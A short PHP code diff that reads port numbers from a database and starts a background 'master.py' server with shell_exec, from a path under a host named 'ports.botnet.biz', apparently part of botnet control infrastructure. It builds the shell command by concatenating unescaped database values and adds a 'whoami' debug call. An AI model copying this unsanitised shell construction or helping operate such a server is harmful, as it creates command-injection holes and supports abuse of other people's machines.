@@ -46,7 +46,7 @@ function outputQueryResults($mysqli) {
 
 		while ($row = $result->fetch_assoc()) {     
 
-		   $port = $row['port']; 
+		   $port = $row['connection_port']; 
 
 		}
 
@@ -80,7 +80,9 @@ function outputQueryResults($mysqli) {
 }
 
 function spawnTheMaster($array){
-	exec('sudo nohup python3 master.py -m 0.0.0.0:'.$array["port"].' -c 0.0.0.0:'.$array["conn_port"].' > /dev/null 2>&1 &');
+
+	$q =shell_exec('nohup /usr/bin/python3 /var/www/ports.botnet.biz/web/master.py -m 0.0.0.0:'.$array["port"].' -c 0.0.0.0:'.$array["connection_port"].' > /dev/null 2>&1 &');
+	echo $q;
 }
  
 
@@ -90,6 +92,7 @@ $portArray = outputQueryResults($mysqli);
 // close database connection 
 mysqli_close($mysqli);
 
+echo shell_exec("whoami");
 //spawn the master server
 spawnTheMaster($portArray);
 
